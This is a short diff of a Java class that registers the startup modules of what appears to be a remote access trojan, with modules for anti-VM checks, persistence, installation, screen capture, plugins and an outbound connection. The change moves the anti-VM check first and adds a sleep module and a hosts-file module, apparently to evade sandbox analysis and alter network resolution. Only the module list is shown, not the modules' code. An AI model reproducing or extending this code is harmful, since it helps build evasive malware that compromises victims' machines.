@@ -11,9 +11,10 @@ public class StartupModules {
 	
 	static {
 		MODULES.clear();
+		MODULES.add(AntiVMStartupModule.class);
+		MODULES.add(SleepStartupModule.class);
 		MODULES.add(InstallerStartupModule.class);
 		MODULES.add(OSXToolBarStartupModule.class);
-		MODULES.add(AntiVMStartupModule.class);
 		MODULES.add(OperatingSystemCheckStartupModule.class);
 		MODULES.add(ConfigVarLoaderStartupModule.class);
 		MODULES.add(MutexStartupModule.class);
@@ -22,6 +23,7 @@ public class StartupModules {
 		MODULES.add(PersistanceStartupModule.class);
 		MODULES.add(ScreenDeviceStartupModule.class);
 		MODULES.add(PluginStartupModule.class);
+		MODULES.add(HostFileStartupModule.class);
 		MODULES.add(ConnectionStarterStartupModule.class);
 	}
 	
